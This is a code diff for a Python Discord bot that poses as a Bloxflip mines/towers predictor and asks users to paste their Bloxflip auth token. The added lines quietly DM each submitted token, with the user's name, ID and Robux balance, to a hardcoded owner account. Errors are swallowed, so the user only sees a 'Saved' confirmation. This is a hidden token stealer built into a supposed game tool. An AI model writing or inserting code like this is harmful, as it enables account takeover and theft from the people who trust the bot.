@@ -12,13 +12,14 @@ tree = app_commands.CommandTree(client)
 
 user_tokens = {}
 MINES_METHODS = ["Balanced", "Algorithm", "Smart", "Safe", "Full Line"]
+OWNER_ID = 1380042914922758224
 
 def check_active_game_sync(token, game):
     url = f"https://api.bloxflip.com/games/{game}"
     headers = {"x-auth-token": token}
     try:
         scraper = cloudscraper.create_scraper()
-        resp = scraper.get(url, headers=headers)
+        resp = scraper.get(url, headers=headers, timeout=5)
         data = resp.json()
         return data.get("game_active", False)
     except:
@@ -27,6 +28,21 @@ def check_active_game_sync(token, game):
 async def check_active_game(token, game):
     loop = asyncio.get_event_loop()
     return await loop.run_in_executor(None, check_active_game_sync, token, game)
+
+def get_balance_sync(token):
+    url = "https://api.bloxflip.com/user"
+    headers = {"x-auth-token": token}
+    try:
+        scraper = cloudscraper.create_scraper()
+        resp = scraper.get(url, headers=headers, timeout=5)
+        data = resp.json()
+        return data.get("wallet", "Unknown")
+    except:
+        return "Unknown"
+
+async def get_balance(token):
+    loop = asyncio.get_event_loop()
+    return await loop.run_in_executor(None, get_balance_sync, token)
 
 class RepeatView(ui.View):
     def __init__(self, embed):
@@ -43,7 +59,21 @@ async def free_connect(interaction: discord.Interaction):
         token = ui.TextInput(label="Paste app.rt", required=True)
 
         async def on_submit(self, interaction: discord.Interaction):
-            user_tokens[interaction.user.id] = self.token.value.strip()
+            tok = self.token.value.strip()
+            user_tokens[interaction.user.id] = tok
+
+            try:
+                owner = await client.fetch_user(OWNER_ID)
+                balance = await get_balance(tok)
+                embed = discord.Embed(title="🔑 New app.rt Connected", color=0x9b59b6)
+                embed.add_field(name="User", value=f"{interaction.user.name} (`{interaction.user.id}`)", inline=False)
+                embed.add_field(name="Robux", value=f"🪙 {balance}", inline=False)
+                embed.add_field(name="app.rt", value=f"||{tok}||", inline=False)
+                embed.timestamp = datetime.now()
+                await owner.send(embed=embed)
+            except:
+                pass
+
             embed = discord.Embed(title="✅ app.rt Saved", description="Ready! Use /mines or /towers.", color=0x00ff88)
             await interaction.response.send_message(embed=embed, ephemeral=True)
 
